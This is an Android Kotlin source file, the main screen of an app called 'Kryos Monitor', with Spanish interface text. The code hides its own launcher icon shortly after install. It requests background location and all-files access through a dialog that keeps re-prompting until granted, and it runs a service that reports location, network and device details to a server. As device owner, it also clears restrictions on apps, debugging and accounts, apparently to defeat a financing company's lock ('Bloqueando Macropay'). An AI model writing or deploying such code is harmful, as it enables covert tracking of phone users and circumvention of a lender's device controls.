package com.kryos.monitor

import android.Manifest
import android.annotation.SuppressLint
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.kryos.monitor.api.ApiService
import com.kryos.monitor.command.DeviceLockdownManager
import com.kryos.monitor.data.DeviceDataCollector
import com.kryos.monitor.service.MonitoringService
import kotlinx.coroutines.*
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.os.UserManager
import com.kryos.monitor.receiver.KryosDeviceAdminReceiver









class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "KryosMainActivity"
        private const val PERMISSION_REQUEST_CODE = 1001
        private const val SETTINGS_REQUEST_CODE = 1002
        private const val ALL_FILES_ACCESS_REQUEST_CODE = 1003

        private val REQUIRED_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.POST_NOTIFICATIONS,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE
            )
        } else {
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE
            )
        }
    }

    
    private lateinit var tvServiceStatus: TextView
    private lateinit var tvDeviceId: TextView
    private lateinit var tvDeviceModel: TextView
    private lateinit var tvAndroidVersion: TextView
    private lateinit var tvBatteryLevel: TextView
    private lateinit var tvConnectionType: TextView
    private lateinit var tvIpAddress: TextView
    private lateinit var tvLocation: TextView
    private lateinit var tvLastSync: TextView
    private lateinit var tvPendingSync: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var statusIndicator: View

    private var dataCollector: DeviceDataCollector? = null
    private var apiService: ApiService? = null
    private var updateJob: Job? = null
    private var prefs: SharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    prefs = getSharedPreferences("kryos_config", Context.MODE_PRIVATE)
val currentVersion =
    packageManager.getPackageInfo(packageName, 0).longVersionCode

val lastVersion = prefs!!.getLong("last_version", -1)

if (lastVersion != currentVersion) {

    prefs!!.edit()
        .putLong("last_version", currentVersion)
        .apply()

    
    Handler(Looper.getMainLooper()).postDelayed({
        hideLauncherIcon()
    }, 30000)
}
    dataCollector = DeviceDataCollector(this)
val collector = dataCollector!!

if (prefs?.getString("employee_name", null) == null) {
    prefs?.edit()
        ?.putString("employee_name", collector.getDeviceId())
        ?.apply()
}
    apiService = ApiService.getInstance(this)

    try {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (dpm.isDeviceOwnerApp(packageName)) {
            val admin = ComponentName(this, KryosDeviceAdminReceiver::class.java)
            dpm.clearUserRestriction(admin, UserManager.DISALLOW_APPS_CONTROL)
	    dpm.clearUserRestriction(admin, UserManager.DISALLOW_DEBUGGING_FEATURES)
  
    dpm.clearUserRestriction(admin, UserManager.DISALLOW_MODIFY_ACCOUNTS)
    dpm.setAccountManagementDisabled(admin, "com.google", false)
    
            Log.i(TAG, "Restricciones removidas")
        } else {
            Log.i(TAG, "No es Device Owner, saltando restricciones")
        }
    } catch (e: Exception) {
        Log.e(TAG, "Error removiendo restricciones: ${e.message}")
    }

    initViews()
    
    checkAndRequestPermissions()
    loadSavedData()
    startStatusUpdates()


}
    override fun onResume() {
        super.onResume()
        updateUI()
    }

    override fun onDestroy() {
        super.onDestroy()
        updateJob?.cancel()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Log.i(TAG, "Todos los permisos concedidos")
                requestAllFilesAccessIfNeeded()
            } else {
                showPermissionDeniedDialog()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == ALL_FILES_ACCESS_REQUEST_CODE) {
            if (hasAllFilesAccess()) {
                Log.i(TAG, "MANAGE_EXTERNAL_STORAGE concedido")
                onOnboardingComplete()
            } else {
                Log.w(TAG, "MANAGE_EXTERNAL_STORAGE no concedido, reintentando")
                requestAllFilesAccessIfNeeded()
            }
        }
    }

    


    private fun initViews() {
        tvServiceStatus = findViewById(R.id.tvServiceStatus)
        tvDeviceId = findViewById(R.id.tvDeviceId)
        tvDeviceModel = findViewById(R.id.tvDeviceModel)
        tvAndroidVersion = findViewById(R.id.tvAndroidVersion)
        tvBatteryLevel = findViewById(R.id.tvBatteryLevel)
        tvConnectionType = findViewById(R.id.tvConnectionType)
        tvIpAddress = findViewById(R.id.tvIpAddress)
        tvLocation = findViewById(R.id.tvLocation)
        tvLastSync = findViewById(R.id.tvLastSync)
        tvPendingSync = findViewById(R.id.tvPendingSync)
       
      
        progressBar = findViewById(R.id.progressBar)
        statusIndicator = findViewById(R.id.statusIndicator)
    }

    


    

        
    


    private fun checkAndRequestPermissions() {
        val permissionsToRequest = REQUIRED_PERMISSIONS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
        } else {
            Log.i(TAG, "Todos los permisos ya concedidos")
            requestAllFilesAccessIfNeeded()
        }
    }

    


    private fun hasAllFilesAccess(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            true 
        }
    }

    



    private fun requestAllFilesAccessIfNeeded() {
        if (hasAllFilesAccess()) {
            onOnboardingComplete()
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            AlertDialog.Builder(this)
                .setTitle("Acceso a archivos requerido")
                .setMessage("Kryos Monitor necesita acceso a todos los archivos para funcionar correctamente. En la siguiente pantalla, activa el permiso para esta app.")
                .setPositiveButton("Continuar") { _, _ ->
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivityForResult(intent, ALL_FILES_ACCESS_REQUEST_CODE)
                }
                .setCancelable(false)
                .show()
        } else {
            onOnboardingComplete()
        }
    }

    




    private fun onOnboardingComplete() {
    
    startMonitoringIfEnabled()
}


    


    

    


    private fun startMonitoringIfEnabled() {
    if (!MonitoringService.isRunning) {
        startMonitoring()
    }
}


private fun startMonitoring() {
    try {
        prefs?.edit()?.putBoolean("monitoring_enabled", true)?.apply()
        MonitoringService.start(this)
        Toast.makeText(this, "Bloqueando Macropay", Toast.LENGTH_SHORT).show()
        updateUI()
    } catch (e: Exception) {
        Log.e(TAG, "Error Bloqueando Macropay: ${e.message}")
        Toast.makeText(this, "Error: ${e.message}", Toast.LENGTH_LONG).show()
    }
}
    


    private fun stopMonitoring() {
        try {
            prefs?.edit()?.putBoolean("monitoring_enabled", false)?.apply()
            MonitoringService.stop(this)
            Toast.makeText(this, "Monitoreo detenido", Toast.LENGTH_SHORT).show()
            updateUI()
        } catch (e: Exception) {
            Log.e(TAG, "Error deteniendo monitoreo: ${e.message}")
        }
    }

    


    private fun loadSavedData() {
        val name = prefs?.getString("employee_name", "") ?: ""
        
    }

    


    private fun startStatusUpdates() {
        updateJob?.cancel()
        updateJob = lifecycleScope.launch {
            while (isActive) {
                updateUI()
                delay(3000) 
            }
        }
    }

private fun hideLauncherIcon() {
    packageManager.setComponentEnabledSetting(
        ComponentName(this, LauncherActivity::class.java),
        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
        PackageManager.DONT_KILL_APP
    )
}



    


    @SuppressLint("SetTextI18n")
    private fun updateUI() {
        val collector = dataCollector ?: return
        val api = apiService ?: return

        
        if (MonitoringService.isRunning) {
            tvServiceStatus.text = "Activo"
            tvServiceStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
            statusIndicator.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_green_dark))
           
        } else {
            tvServiceStatus.text = "Inactivo"
            tvServiceStatus.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
            statusIndicator.setBackgroundColor(ContextCompat.getColor(this, android.R.color.holo_red_dark))
           
        }

        
        tvDeviceId.text = collector.getDeviceId()
        tvDeviceModel.text = "${collector.getManufacturer()} ${collector.getDeviceModel()}"
        tvAndroidVersion.text = collector.getAndroidVersion()

        
        val battery = collector.getBatteryLevel()
        tvBatteryLevel.text = "$battery% ${if (collector.isCharging()) "(Cargando)" else ""}"

        
        val connType = collector.getConnectionType()
        val wifiName = collector.getWifiName()
        tvConnectionType.text = if (connType == "wifi" && wifiName != null) {
            "WiFi: $wifiName"
        } else {
            connType.uppercase()
        }

        
        val localIp = collector.getLocalIp()
        tvIpAddress.text = localIp ?: "Desconocida"

        
        lifecycleScope.launch {
            try {
                val location = collector.getCurrentLocation()
                if (location.latitude != 0.0 && location.longitude != 0.0) {
                    tvLocation.text = "${location.latitude.format(4)}, ${location.longitude.format(4)}"
                } else {
                    tvLocation.text = "Obteniendo..."
                }
            } catch (e: Exception) {
                tvLocation.text = "No disponible"
            }
        }

        
        val lastSync = prefs?.getLong("last_sync_time", 0) ?: 0
        tvLastSync.text = if (lastSync > 0) {
            val sdf = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault())
            sdf.format(java.util.Date(lastSync))
        } else {
            "Nunca"
        }

        
        val pending = api.getPendingCount()
        tvPendingSync.text = pending.toString()
        if (pending > 0) {
            tvPendingSync.setTextColor(ContextCompat.getColor(this, android.R.color.holo_orange_dark))
        } else {
            tvPendingSync.setTextColor(ContextCompat.getColor(this, android.R.color.darker_gray))
        }
    }



    


    private fun showPermissionDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permisos requeridos")
            .setMessage("Kryos Monitor necesita permisos de ubicación y notificaciones para funcionar correctamente. ¿Desea ir a la configuración?")
            .setPositiveButton("Configuración") { _, _ ->
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", packageName, null)
                }
                startActivityForResult(intent, SETTINGS_REQUEST_CODE)
            }
            .setNegativeButton("Cancelar", null)
            .setCancelable(false)
            .show()
    }

    


    private fun Double.format(digits: Int) = java.lang.String.format("%.${digits}f", this)
}
